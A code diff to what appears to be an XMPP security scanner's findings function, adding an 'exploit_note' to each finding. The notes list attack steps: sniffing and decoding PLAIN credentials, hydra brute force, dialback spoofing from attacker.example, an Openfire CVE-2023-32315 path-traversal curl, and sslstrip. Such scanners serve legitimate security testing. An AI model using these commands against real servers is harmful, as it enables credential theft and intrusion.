@@ -684,7 +684,12 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     f"{h.ip}:{p.portid}   # then look for <mechanism/> list",
                     "Restrict the advertised list to SCRAM-SHA-256(-PLUS); drop "
                     "PLAIN/LOGIN entirely unless the transport is guaranteed TLS.",
-                    ["CWE-327", "CWE-319"], kind="xmpp_weak_sasl"))
+                    ["CWE-327", "CWE-319"], kind="xmpp_weak_sasl",
+                    exploit_note=(
+                        "tcpdump 'tcp port 5222' + base64-decode PLAIN "
+                        "blobs; or hydra -L users.txt -P passwords.txt "
+                        "xmpp://<ip>"),
+                    depth_tier="t1"))
 
             # s2s dialback posture (5269-only).
             if is_s2s and feats.get("dialback_offered") and not feats.get(
@@ -697,7 +702,13 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "Require TLS on s2s (s2s_require_encryption = true / "
                     "s2s_use_starttls = required_trusted) and validate cert "
                     "chains against PKIX.",
-                    ["CWE-295", "CWE-345"], kind="xmpp_s2s_dialback_weak"))
+                    ["CWE-295", "CWE-345"], kind="xmpp_s2s_dialback_weak",
+                    exploit_note=(
+                        "From a controlled domain: open s2s to "
+                        "<target>:5269, send <db:result to='<target>' "
+                        "from='attacker.example'>KEY</db:result>, observe "
+                        "accept — proves spoofable federation."),
+                    depth_tier="t1"))
 
             # Product fingerprint (drives CVE mapper).
             sw = pr.get("sw_version") or {}
@@ -713,7 +724,12 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "python", f"python -c 'iq get {_XMLNS_VERSION} to {h.ip}'",
                     "Restrict XEP-0092 to authenticated peers (mod_version "
                     "hide_os_type / iq_version_show).", ["CWE-200"],
-                    kind="xmpp_sw_version"))
+                    kind="xmpp_sw_version",
+                    exploit_note=(
+                        "For Openfire: curl -k 'https://<ip>:9090/setup/"
+                        "setup-s/../../../log.jsp' — CVE-2023-32315 "
+                        "exposure; then vendor-specific PoC."),
+                    depth_tier="t2"))
             elif pr.get("product"):
                 out.append(_finding(
                     "low", f"XMPP server fingerprinted: {pr['product']}", tgt,
@@ -722,7 +738,11 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     f"'{pr.get('stream_error','')[:120]}'.",
                     "python", f"python -c 'stream to bogus on {h.ip}:{p.portid}'",
                     "Suppress product strings from stream errors and greetings "
-                    "where possible.", ["CWE-200"], kind="xmpp_fingerprint"))
+                    "where possible.", ["CWE-200"], kind="xmpp_fingerprint",
+                    exploit_note=(
+                        "Trigger stream error with bogus 'to' and read "
+                        "<text> body."),
+                    depth_tier="t0"))
 
             # Service-discovery component map.
             comps = pr.get("components") or []
@@ -740,7 +760,14 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "python", f"python -c 'disco items to {pr.get('server_from') or h.ip}'",
                     "Restrict XEP-0030 to authenticated peers on production; "
                     "disable admin/adhoc components on public listeners.",
-                    ["CWE-200"], kind="xmpp_disco_components"))
+                    ["CWE-200"], kind="xmpp_disco_components",
+                    exploit_note=(
+                        "Feed each component JID: <iq type='get' "
+                        "to='upload.<domain>'><request xmlns='urn:xmpp:"
+                        "http:upload:0' filename='r.txt' size='4' "
+                        "content-type='text/plain'/></iq>; PUT canary to "
+                        "returned URL."),
+                    depth_tier="t2"))
 
             # Legacy TLS on 5223.
             if legacy:
@@ -756,7 +783,10 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     f"openssl s_client -connect {h.ip}:{p.portid} -showcerts",
                     "Migrate clients to 5222 + STARTTLS; retire 5223 once no "
                     "legacy client remains.",
-                    ["CWE-295"], kind="xmpp_legacy_tls_5223"))
+                    ["CWE-295"], kind="xmpp_legacy_tls_5223",
+                    exploit_note=(
+                        "openssl s_client -connect <ip>:5223 -showcerts"),
+                    depth_tier="t0"))
                 if from_dom and sans and not any(
                         _san_covers(s, from_dom) for s in sans + [cn]):
                     out.append(_finding(
@@ -769,7 +799,12 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                         "openssl",
                         f"openssl s_client -connect {h.ip}:{p.portid}",
                         "Re-issue the cert with SAN covering the XMPP domain.",
-                        ["CWE-295"], kind="xmpp_cert_mismatch"))
+                        ["CWE-295"], kind="xmpp_cert_mismatch",
+                        exploit_note=(
+                            "On-path: bettercap sslstrip against 5223 "
+                            "client traffic (rare in prod, common in "
+                            "isolated labs)."),
+                        depth_tier="t0"))
     return out
 
 
